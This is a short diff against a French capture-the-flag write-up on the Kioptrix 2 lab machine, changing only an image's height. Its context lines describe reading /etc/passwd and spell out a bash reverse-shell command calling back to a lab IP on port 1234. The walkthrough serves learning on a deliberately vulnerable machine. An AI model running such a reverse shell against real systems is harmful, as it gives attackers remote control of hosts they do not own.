@@ -64,7 +64,7 @@ Succès,on a réussi à lire le fichier /etc/passwd.donc on va essayer d'anvoyer
 </p>
 je met en mode écoute pour un reverse shell,et rien n'est passé.Donc la commande netcat peut etre n'est pas installé,donc il faut essayer avec une méthode.**bash -i >& /dev/tcp/10.0.4.4/1234 0>&1** est une commande qui permet de nous envoyer un reverse shell.
 <p align="center">
-  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/get_reverse_shell_11.png" width="860" height="170">
+  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/get_reverse_shell_11.png" width="860" height="220">
 </p>
 comme avec l'utilitaire Ping, nous sommes connectés au compte apache,mais on n'a pas le droit de se connecter au shell.
 <p align="center">
